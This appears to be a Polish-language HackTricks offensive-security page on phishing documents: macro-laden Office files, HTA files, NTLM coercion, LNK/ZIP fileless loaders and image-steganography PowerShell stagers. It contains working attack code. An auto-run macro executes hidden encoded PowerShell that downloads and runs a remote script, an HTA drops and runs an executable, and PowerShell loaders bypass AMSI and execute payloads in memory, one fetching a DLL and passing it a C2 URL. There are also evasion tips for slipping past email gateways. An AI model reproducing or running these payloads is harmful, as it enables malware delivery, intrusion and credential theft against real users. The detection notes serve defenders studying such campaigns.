# Phishing Pliki i Dokumenty

{{#include ../../banners/hacktricks-training.md}}

## Dokumenty Office

Microsoft Word przeprowadza weryfikację danych pliku przed jego otwarciem. Weryfikacja danych polega na identyfikacji struktury danych zgodnie ze standardem OfficeOpenXML. Jeśli podczas identyfikacji struktury danych wystąpi jakikolwiek błąd, plik będący przedmiotem analizy nie zostanie otwarty.

Zazwyczaj pliki Word zawierające macros używają rozszerzenia `.docm`. Jednak możliwe jest zmienienie nazwy pliku poprzez zmianę rozszerzenia i zachowanie możliwości wykonywania macros.\
Na przykład plik RTF nie obsługuje macros, z założenia, ale plik DOCM przemianowany na RTF zostanie obsłużony przez Microsoft Word i będzie zdolny do wykonywania macros.\
Te same mechanizmy wewnętrzne mają zastosowanie do całego oprogramowania Microsoft Office Suite (Excel, PowerPoint itp.).

Możesz użyć następującego polecenia, aby sprawdzić, które rozszerzenia będą wykonywane przez niektóre programy Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### Ładowanie zewnętrznego obrazu

Przejdź do: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Możliwe jest użycie macros do uruchomienia dowolnego kodu z dokumentu.

#### Autoload functions

Im są bardziej powszechne, tym bardziej prawdopodobne, że AV je wykryje.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ręczne usuwanie metadanych

Przejdź do **File > Info > Inspect Document > Inspect Document**, co otworzy Document Inspector. Kliknij **Inspect**, a następnie **Remove All** obok **Document Properties and Personal Information**.

#### Rozszerzenie dokumentu

When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
Zrób to, ponieważ **nie można zapisać makr w `.docx`** i wokół rozszerzenia makr **`.docm`** istnieje pewne piętno (np. miniatura ma duży `!` i niektóre bramy web/email całkowicie je blokują). Dlatego to **stare rozszerzenie `.doc` jest najlepszym kompromisem**.

#### Generatory złośliwych makr

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Pliki HTA

An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. Tworzy interfejs użytkownika i uruchamia się jako aplikacja „w pełni zaufana”, bez ograniczeń modelu bezpieczeństwa przeglądarki.

HTA jest uruchamiane za pomocą **`mshta.exe`**, który zwykle jest **instalowany** razem z **Internet Explorer**, co czyni **`mshta` zależnym od IE**. Jeśli IE zostało odinstalowane, HTA będą niezdolne do uruchomienia.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Wymuszanie uwierzytelniania NTLM

Istnieje kilka sposobów, aby **wymusić uwierzytelnianie NTLM "zdalnie"**, na przykład możesz dodać **niewidoczne obrazy** do e-maili lub HTML, które użytkownik otworzy (nawet HTTP MitM?). Albo wysłać ofierze **adres plików**, które **wywołają** **uwierzytelnianie** już przy **otwarciu folderu.**

**Sprawdź te pomysły i więcej na poniższych stronach:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Nie zapominaj, że możesz nie tylko ukraść hash lub uwierzytelnianie, ale także przeprowadzić **NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Bardzo skuteczne kampanie dostarczają ZIP, który zawiera dwa legalne dokumenty przynęty (PDF/DOCX) oraz złośliwy .lnk. Sztuczka polega na tym, że właściwy PowerShell loader jest przechowywany w surowych bajtach ZIP-a po unikalnym markerze, a .lnk wycina go i uruchamia w całości w pamięci.

Typowy przebieg implementowany przez .lnk PowerShell one-liner:

1) Zlokalizuj oryginalny ZIP w typowych ścieżkach: Desktop, Downloads, Documents, %TEMP%, %ProgramData% oraz katalog nadrzędny bieżącego katalogu roboczego.  
2) Odczytaj bajty ZIP-a i znajdź zakodowany na stałe marker (np. xFIQCV). Wszystko po markerze to osadzony PowerShell payload.  
3) Skopiuj ZIP do %ProgramData%, rozpakuj tam i otwórz przynętę .docx, aby wyglądać wiarygodnie.  
4) Omijaj AMSI dla bieżącego procesu: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) Zdeobfuskować następny etap (np. usunąć wszystkie znaki #) i wykonać go w pamięci.

Przykładowy szkielet PowerShell do wyodrębnienia i uruchomienia osadzonego etapu:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notatki
- Dostarczenie często nadużywa wiarygodnych subdomen PaaS (np. *.herokuapp.com) i może ograniczać dostęp do payloadów (serwując nieszkodliwe ZIPy w zależności od IP/UA).
- Kolejny etap często deszyfruje base64/XOR shellcode i wykonuje go przez Reflection.Emit + VirtualAlloc, aby zminimalizować artefakty na dysku.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Wykrywanie / IOCs
- Pliki ZIP zawierające ciąg znaków ASCII-marka (np. xFIQCV) dopisany do danych archiwum.
- .lnk, który enumeruje foldery nadrzędne/użytkownika, aby zlokalizować ZIP i otworzyć fałszywy dokument.
- Manipulacja AMSI przez [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Długotrwałe wątki biznesowe kończące się linkami hostowanymi pod zaufanymi domenami PaaS.

## Payloady oddzielone steganografią w obrazach (PowerShell stager)

Najnowsze łańcuchy loaderów dostarczają zniekształcony JavaScript/VBS, który dekoduje i uruchamia Base64 PowerShell stager. Ten stager pobiera obraz (często GIF), który zawiera Base64-encoded .NET DLL ukrytą jako zwykły tekst pomiędzy unikatowymi markerami start/koniec. Skrypt wyszukuje te delimitery (przykłady widziane w terenie: «<<sudo_png>> … <<sudo_odt>>>»), wyciąga tekst pomiędzy, dekoduje Base64 do bajtów, ładuje assembly do pamięci i wywołuje znaną metodę wejściową z C2 URL.

Przebieg
- Etap 1: Archived JS/VBS dropper → dekoduje osadzone Base64 → uruchamia PowerShell stager z -nop -w hidden -ep bypass.
- Etap 2: PowerShell stager → pobiera obraz, wycina Base64 ograniczony markerami, ładuje .NET DLL do pamięci i wywołuje jego metodę (np. VAI), przekazując C2 URL i opcje.
- Etap 3: Loader pobiera końcowy payload i zwykle injektuje go za pomocą process hollowing do zaufanego binarium (zwykle MSBuild.exe). Zobacz więcej o process hollowing i trusted utility proxy execution tutaj:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notatki
- To jest ATT&CK T1027.003 (steganography/marker-hiding). Markery różnią się między kampaniami.
- AMSI/ETW bypass oraz deobfuskacja stringów są zwykle stosowane przed załadowaniem assembly.
- Hunting: skanuj pobrane obrazy pod kątem znanych delimiterów; identyfikuj PowerShell uzyskujący dostęp do obrazów i natychmiast dekodujący Base64 blobs.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Powtarzający się etap początkowy to mały, silnie obfuskowany `.js` lub `.vbs` dostarczony w archiwum. Jego jedynym celem jest zdekodowanie osadzonego ciągu Base64 i uruchomienie PowerShell z `-nop -w hidden -ep bypass`, aby bootstrapować następny etap przez HTTPS.

Szkielet logiki (ogólny):
- Odczytaj zawartość własnego pliku
- Zlokalizuj blob Base64 między zbędnymi ciągami
- Zdekoduj do ASCII PowerShell
- Wykonaj za pomocą `wscript.exe`/`cscript.exe` wywołujących `powershell.exe`

Hunting cues
- Zarchiwizowane załączniki JS/VBS wywołujące `powershell.exe` z `-enc`/`FromBase64String` w linii poleceń.
- `wscript.exe` uruchamiający `powershell.exe -nop -w hidden` z katalogów tymczasowych użytkownika.

## Windows files to steal NTLM hashes

Sprawdź stronę o **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Referencje

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
